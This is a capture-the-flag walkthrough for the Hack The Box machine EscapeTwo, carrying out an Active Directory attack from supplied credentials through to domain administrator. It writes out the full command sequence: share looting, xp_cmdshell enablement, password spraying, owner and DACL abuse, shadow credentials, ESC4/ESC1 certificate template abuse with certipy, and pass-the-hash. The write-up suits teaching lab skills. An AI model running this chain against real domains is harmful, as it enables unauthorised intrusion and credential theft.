---
icon: windows
---

# EscapeTwo - Easy

<figure><img src="../../.gitbook/assets/image (2352).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/escapetwo"><strong>EscapeTwo</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.51 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 08:00 EDT
Nmap scan report for 10.10.11.51
Host is up (0.097s latency).
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-03 12:02:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-10-03T12:04:08+00:00; -6s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40                                                                                                             
|_ssl-date: 2025-10-03T12:04:08+00:00; -6s from scanner time.                                                                                       
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM                                                                          
|_ssl-date: 2025-10-03T12:04:08+00:00; -6s from scanner time.                                                                                       
| ms-sql-ntlm-info:                                                                                                                                 
|   10.10.11.51:1433:                                                                                                                               
|     Target_Name: SEQUEL                                                                                                                           
|     NetBIOS_Domain_Name: SEQUEL                                                                                                                   
|     NetBIOS_Computer_Name: DC01                                                                                                                   
|     DNS_Domain_Name: sequel.htb                                                                                                                   
|     DNS_Computer_Name: DC01.sequel.htb                                                                                                            
|     DNS_Tree_Name: sequel.htb                                                                                                                     
|_    Product_Version: 10.0.17763                                                                                                                   
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                            
| Not valid before: 2025-10-03T11:53:55                                                                                                             
|_Not valid after:  2055-10-03T11:53:55                                                                                                             
| ms-sql-info:                                                                                                                                      
|   10.10.11.51:1433:                                                                                                                               
|     Version:                                                                                                                                      
|       name: Microsoft SQL Server 2019 RTM                                                                                                         
|       number: 15.00.2000.00                                                                                                                       
|       Product: Microsoft SQL Server 2019                                                                                                          
|       Service pack level: RTM                                                                                                                     
|       Post-SP patches applied: false                                                                                                              
|_    TCP port: 1433                                                                                                                                
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                         
|_ssl-date: 2025-10-03T12:04:08+00:00; -6s from scanner time.                                                                                       
| ssl-cert: Subject:                                                                                                                                
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL                                                                         
| Not valid before: 2025-06-26T11:34:57                                                                                                             
|_Not valid after:  2124-06-08T17:00:40                                                                                                             
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                         
|_ssl-date: 2025-10-03T12:04:08+00:00; -6s from scanner time.                                                                                       
| ssl-cert: Subject:                                                                                                                                
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL                                                                         
| Not valid before: 2025-06-26T11:34:57                                                                                                             
|_Not valid after:  2124-06-08T17:00:40                                                                                                             
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                               
|_http-title: Not Found                                                                                                                             
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                         
9389/tcp  open  mc-nmf        .NET Message Framing                                                                                                  
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
49810/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -6s, deviation: 0s, median: -6s
| smb2-time: 
|   date: 2025-10-03T12:03:33
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   37.54 ms  10.10.16.1
2   218.99 ms 10.10.11.51
```

We are starting with an assumed breach scenario, using credentials provided for Rose

```
rose:KxEPkKe6R8su
```

Nmap identified the domain names `sequel.htb` and `dc01.sequel.htb`. I will add entries for them to `/etc/hosts`

```
10.10.11.51 	sequel.htb dc01.sequel.htb
```

### <mark style="color:$primary;">SMB Enumeration</mark>

```
netexec smb sequel.htb -u rose -p KxEPkKe6R8su --shares
```

<figure><img src="../../.gitbook/assets/image (2353).png" alt=""><figcaption></figcaption></figure>

I am going to check out the shares, see if I find anything interesting

<pre><code><strong>smbclient \\\\sequel.htb\\'Accounting Department' -U 'rose%KxEPkKe6R8su'
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (828).png" alt=""><figcaption></figcaption></figure>

Accounting department has 2 excel files. However I could not open them in libre office or excel they would come up as corrupted so I unzipped them and checked each file manually

```
unzip accounts.xlsx
```

<figure><img src="../../.gitbook/assets/image (829).png" alt=""><figcaption></figcaption></figure>

inside **`/xl/sharedStrings.xml`** I found some usernames and passwords

<figure><img src="../../.gitbook/assets/image (830).png" alt=""><figcaption></figcaption></figure>

I saved them all into a usernames and passwords files

<figure><img src="../../.gitbook/assets/image (831).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (832).png" alt=""><figcaption></figcaption></figure>

sa has access to the MSSQL Database let's take a look

### <mark style="color:$primary;">Enumerating MSSQL</mark>

```
impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.10.11.51
```

<figure><img src="../../.gitbook/assets/image (834).png" alt=""><figcaption></figcaption></figure>

I was able to activate xp\_cmdshell with the following commands:

```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

### <mark style="color:$primary;">xp\_cmdshell RCE</mark>

I am going to use code execution and get a reverse shell. I Will be using [https://www.revshells.com/](https://www.revshells.com/)&#x20;

<figure><img src="../../.gitbook/assets/image (836).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (837).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (838).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Enumeration as sql\_svc</mark>

<figure><img src="../../.gitbook/assets/image (839).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (840).png" alt=""><figcaption></figcaption></figure>

We found a password in sql-configuration.ini

I am going to grab all usernames with rid-cycling and check against all the passwords I found so far:

### <mark style="color:$primary;">RID Cycling</mark>

```
netexec smb sequel.htb -u rose -p KxEPkKe6R8su --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users
```

<figure><img src="../../.gitbook/assets/image (841).png" alt=""><figcaption></figcaption></figure>

```
netexec smb sequel.htb -u users -p passwords --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (842).png" alt=""><figcaption></figcaption></figure>

ryan and sql\_svc use the same password!

<figure><img src="../../.gitbook/assets/image (843).png" alt=""><figcaption></figcaption></figure>

ryan has winrm access!

Before I get a shell I am going to checkout bloodhound

### <mark style="color:$primary;">Bloodhound</mark>

I am going to use netexec to do bloodhound collection

```
netexec ldap sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --bloodhound --collection All --dns-server 10.10.11.51
```

<figure><img src="../../.gitbook/assets/image (844).png" alt=""><figcaption></figcaption></figure>

Let's start bloodhound and take a look.

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (845).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (846).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$success;">**CA\_SVC**</mark> makes me think this a Certificate Authority!

<mark style="color:$success;">**Ryan**</mark> has WriteOwner permission on <mark style="color:$success;">**CA\_SVC!**</mark>

<mark style="color:$success;">**CA\_SVC**</mark> is the certificate issuer, the owner of <mark style="color:$success;">**CA\_SVC**</mark> can be set to <mark style="color:$success;">**Ryan**</mark>.

### <mark style="color:$primary;">WriteOwner</mark>&#x20;

<mark style="color:$primary;">**1)**</mark> I am going to use the writeOwner permission to set Ryan as the Owner of <mark style="color:$success;">**CA\_SVC**</mark>

```
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

<figure><img src="../../.gitbook/assets/image (849).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$primary;">**2)**</mark> Then grant <mark style="color:$success;">**ryan**</mark> full control permissions

```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
```

<figure><img src="../../.gitbook/assets/image (848).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$primary;">**3)**</mark> From here , we create a TGT and then obtain an NTLM hash that we can pass around. I will be using pywhisker

```
python3 ~/tools/Windows/pywhisker/pywhisker/pywhisker.py -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --target "CA_SVC" --action "add" --filename CACert --export PEM
```

<figure><img src="../../.gitbook/assets/image (850).png" alt=""><figcaption></figcaption></figure>

if a few minutes have gone by from steps 2 to 3 you might have to repeat steps 1–2 again before completing step 3

<mark style="color:$primary;">**4)**</mark> Now to export the certificate

```
python3 /home/kali/tools/Windows/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem sequel.htb/ca_svc ca_svc.ccache
```

```
export KRB5CCNAME=ca_svc.ccache
```

<figure><img src="../../.gitbook/assets/image (851).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$primary;">**5)**</mark> Get CA\_SVC HASH

```
python3 /home/kali/tools/Windows/PKINITtools/getnthash.py -key 6d7187f16d883f6494b5502097ca8968d4b0636e5ea1316bd881794e10b123bb sequel.htb/ca_svc
```

<figure><img src="../../.gitbook/assets/image (852).png" alt=""><figcaption></figcaption></figure>

I am going to test the Hash against all users. I know it belongs to CA\_SVC but we might get lucky and Admin might have the same hash

```
netexec smb sequel.htb -u users -H 3b181b914e7a9d5508ea1e20bc2b7fce
```

<figure><img src="../../.gitbook/assets/image (853).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Checking for Misconfigured ADCS</mark>

```
certipy-ad find -vulnerable -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -stdout
```

<figure><img src="../../.gitbook/assets/image (856).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (854).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (855).png" alt=""><figcaption></figcaption></figure>

From the Certipy output, we can see that the ADCS setup is vulnerable to <mark style="color:red;">**ESC4**</mark>

The following [**link**](https://medium.com/r3d-buck3t/adcs-attack-series-abusing-esc4-via-template-acls-for-privilege-escalation-98320f0da59a) gives detailed explanation's on how to abuse ESC4 templates

### <mark style="color:$primary;">ESC4 -> ESC1 -> administrator hash</mark>

We need to backup the template, perform ECS1, authorize and get the admin NTLM, then login as admin!

#### <mark style="color:$primary;">Backup Original</mark>

FYI the article mentioned above uses an older version of certipy&#x20;

```
certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -save-configuration DunderMifflinAuthentication-original
```

<figure><img src="../../.gitbook/assets/image (2354).png" alt=""><figcaption></figcaption></figure>

Now that we saved the old configuration. Let’s modify the template.

```
certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
```

<figure><img src="../../.gitbook/assets/image (2355).png" alt=""><figcaption></figcaption></figure>

If you do not perform the above commands in rapid succession. You will encounter errors. You just need to copy the commands and paste them and it will work!

### <mark style="color:$primary;">Perform ESC1</mark>

<mark style="color:red;">**ESC1**</mark>: A misconfigured certificate template allows low-privileged users to request a certificate for any user, including Domain Admins.

We request a certificate for the `administrator` user. The certificate will be saved as `administrator.pfx`

```
certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -target dc01.sequel.htb -target-ip 10.10.11.51
```

<figure><img src="../../.gitbook/assets/image (2356).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Using the obtained certificate to authenticate as the target</mark>

First I will sync my \[kali]machines clock to the target machines DC. Before authenticating to the target machine with the obtained certificate.

```
service virtualbox-guest-utils stop
```

```
sudo ntpdate 10.10.11.202
```

```
certipy-ad auth -pfx administrator.pfx -domain sequel.htb -username administrator -dc-ip 10.10.11.51
```

<figure><img src="../../.gitbook/assets/image (2357).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$success;">**certipy-ad**</mark> successfully authenticated as the <mark style="color:$success;">**administrator**</mark> user and retrieved the NT hash

Now with this NT hash we obtained, we can now get a shell on the target machine as the administrator user

```
evil-winrm -i sequel.htb -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

<figure><img src="../../.gitbook/assets/image (2358).png" alt=""><figcaption></figcaption></figure>

